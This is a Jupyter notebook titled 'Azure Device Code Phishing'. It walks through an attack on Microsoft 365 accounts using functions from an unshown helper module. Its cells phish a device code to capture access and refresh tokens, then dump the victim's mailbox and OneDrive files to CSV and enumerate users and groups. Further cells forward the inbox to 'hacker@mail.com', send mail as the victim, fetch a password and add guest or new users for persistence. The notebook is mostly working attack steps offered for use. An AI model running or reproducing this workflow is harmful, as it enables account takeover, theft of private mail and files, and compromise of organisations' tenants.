{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Azure Device Code Phishing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import time\n",
    "import jwt\n",
    "import base64\n",
    "import json\n",
    "import pandas as pd\n",
    "from helper import *"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Generate Device Code and get Auth Data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "\n",
    "device_code, interval, expires_in = get_device_code_phish()\n",
    "auth_data = get_auth(device_code, interval, expires_in)\n",
    "\n",
    "## auth_data stores the access and refresh tokens"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Use captured tokens to dump OWA of user"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "mail, email_add = dump_owa_mailbox_graph_api(auth_data)\n",
    "df = pd.json_normalize(mail['mail'])\n",
    "df.to_csv(f\"{email_add}_owa.csv\")\n",
    "df"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Refresh token for another resource"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "new_auth = refresh_token_to(auth_data, 'substrate')\n",
    "new_auth"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "new_auth = refresh_token_to(auth_data, 'graph')\n",
    "new_auth"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Use captured tokens to dump User's OneDrive files"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "files, user = dump_drive_graph_api(auth_data)\n",
    "df = pd.json_normalize(files['data'])\n",
    "df.to_csv(f\"{user}_one_drive.csv\")\n",
    "df"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Users"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "users = get_users(auth_data)\n",
    "df = pd.json_normalize(users['data'])\n",
    "df.to_csv(f\"users.csv\")\n",
    "df"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get User with OID"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "get_user(auth_data, 'xxx-xxx')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Groups"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "groups = get_groups(auth_data)\n",
    "df = pd.json_normalize(groups['data'])\n",
    "df.to_csv(f\"groups.csv\")\n",
    "df"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Mail Forwarding"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# forwards inbox to specified email\n",
    "\n",
    "## graph api\n",
    "owa_inbox_forward(auth_data, \"hacker\", \"hacker@mail.com\")\n",
    "\n",
    "## outlook apit\n",
    "owa_inbox_forward_outlook(auth_data, \"hacker\", \"hacker@mail.com\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Send Email with API"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# message para\n",
    "'''\n",
    "message = {\n",
    "            \"message\": {\n",
    "                \"subject\": \"Test Email\",\n",
    "                \"body\": {\n",
    "                    \"contentType\": \"Text\",\n",
    "                    \"content\": \"This is a test email.\"\n",
    "                },\n",
    "                \"toRecipients\": [\n",
    "                    {\n",
    "                        \"emailAddress\": {\n",
    "                            \"address\": \"abc@def.com\"\n",
    "                        }\n",
    "                    }],\n",
    "                \"attachments\": [\n",
    "                    {\n",
    "                        \"@odata.type\": \"#microsoft.graph.fileAttachment\",\n",
    "                        \"name\": \"attachment.txt\",\n",
    "                        \"contentType\": \"text/plain\",\n",
    "                        \"contentBytes\": \"SGVsbG8gV29ybGQh\"\n",
    "                    }\n",
    "                ]\n",
    "            },\n",
    "            \"saveToSentItems\": \"false\"\n",
    "        }\n",
    "\n",
    "'''\n",
    "\n",
    "owa_send_email(auth_data, message = None)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# message para\n",
    "\n",
    "'''\n",
    "message = {\n",
    "            \"Message\": {\n",
    "                \"Subject\": \"Test Email\",\n",
    "                \"Body\": {\n",
    "                    \"ContentType\": \"HTML\",\n",
    "                    \"Content\": \"<html>This is a test email.</html>\"\n",
    "                },\n",
    "                \"ToRecipients\": [\n",
    "                    {\n",
    "                        \"EmailAddress\": {\n",
    "                            \"Address\": \"abc@def.com\"\n",
    "                        }\n",
    "                    }],\n",
    "                \"Attachments\": [\n",
    "                    {\n",
    "                        \"@odata.type\": \"#Microsoft.OutlookServices.FileAttachment\",\n",
    "                        \"Name\": \"attachment.txt\",\n",
    "                        \"ContentBytes\": \"SGVsbG8gV29ybGQh\"\n",
    "                    }\n",
    "                ]\n",
    "            },\n",
    "            \"SaveToSentItems\": \"false\"\n",
    "        }\n",
    "'''\n",
    "\n",
    "\n",
    "## outlook api\n",
    "owa_send_email_outlook(auth_data, message = None)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Password"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "get_password(auth_data)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Invite User as Guest"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "invite_user(auth_data, 'abc@def.com')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Change User Attribute to Member"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "patch_user(auth_data, 'xxx-xxx-xxx')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Add New User"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "'''\n",
    "data = {\n",
    "    \"accountEnabled\": True,\n",
    "    \"displayName\": \"John\",\n",
    "    \"userPrincipalName\": \"john@abc.com\",\n",
    "    \"passwordProfile\" : {\n",
    "        \"forceChangePasswordNextSignIn\": False,\n",
    "        \"password\": \"Passw0rd!\"\n",
    "    }\n",
    "}\n",
    "'''\n",
    "\n",
    "\n",
    "create_user(auth_data, data)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
